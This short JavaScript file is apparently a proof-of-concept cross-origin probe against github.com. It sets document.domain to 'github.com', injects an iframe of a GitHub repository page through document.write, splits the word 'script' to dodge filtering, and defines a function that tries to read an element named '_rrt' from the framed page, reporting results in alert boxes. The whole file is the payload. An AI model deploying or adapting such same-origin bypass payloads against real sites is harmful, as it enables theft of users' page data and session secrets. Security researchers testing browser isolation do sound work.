alert('probe:'+document.domain+' '+document.location.href);

document.domain="github.com";

document.write("<iframe src='http://github.com/gojomo/gojomo.github.com/tree/master'><iframe><scr"+"ipt>alert('second:'+document.domain+' '+document.location.href);function doit(){alert(document.getElementById('if').contentDocument.getElementById('_rrt').innerHTML)}</script><a onclick='doit()'>doit</a>");

